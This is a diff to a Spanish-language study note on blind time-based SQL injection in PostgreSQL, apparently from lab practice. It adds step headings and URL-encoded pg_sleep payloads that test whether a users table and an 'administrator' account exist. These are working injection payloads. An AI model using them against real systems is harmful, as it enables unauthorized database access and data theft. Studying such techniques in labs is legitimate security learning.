@@ -11,7 +11,9 @@ TrackingId=x'||pg_sleep(10)--
 ```
 
 
-# Blind SQL injection with time delays and information retrieval
+# Blind SQL injection with time delays and information retrieval 
+
+# Checar si el vulnerable al Ataque Paso 1
 
 Para probar si es vulnerable a este tipo de ataque se pueden utilizar los condicionales
 
@@ -22,7 +24,7 @@ SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 ```
 
-# Orden de ejecucion en SQL ( para probar existencia de tablas)
+# Orden de ejecucion en SQL Paso 2 ( para probar existencia de tablas)
 
 > https://programacion.net/articulo/el_orden_de_ejecucion_de_las_queries_en_sql_1032
 
@@ -46,4 +48,18 @@ Cuando escribes una serie de comandos dentro de una query sql, estos comandos se
 11. TOP
 ```
 
+
+## Checar Tablas y Sacar informacion 
+
+```
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+Por el Orden de ejecucion
+
+```
+
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END from users where username='administrator'--;
+
+```
 
